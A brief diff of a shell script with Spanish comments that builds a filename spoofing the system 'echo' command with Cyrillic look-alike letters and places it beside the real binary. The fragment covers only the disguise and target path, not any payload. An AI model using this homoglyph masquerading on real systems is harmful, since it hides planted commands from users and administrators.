@@ -9,7 +9,7 @@ RUTA_ECHO_REAL=$(which echo)
 DIR_ECHO_REAL=$(dirname "$RUTA_ECHO_REAL")
 
 # Nombre disfrazado: 'echo' con la 'e' cirílica (U+0435)
-NOMBRE_CAMUFLADO="$(echo -e '\u0435h\u0441\u043e')"
+NOMBRE_CAMUFLADO="$(echo -e '\u0435\u0441h\u043e')"
 
 # Ruta destino final
 DESTINO="$DIR_ECHO_REAL/$NOMBRE_CAMUFLADO"
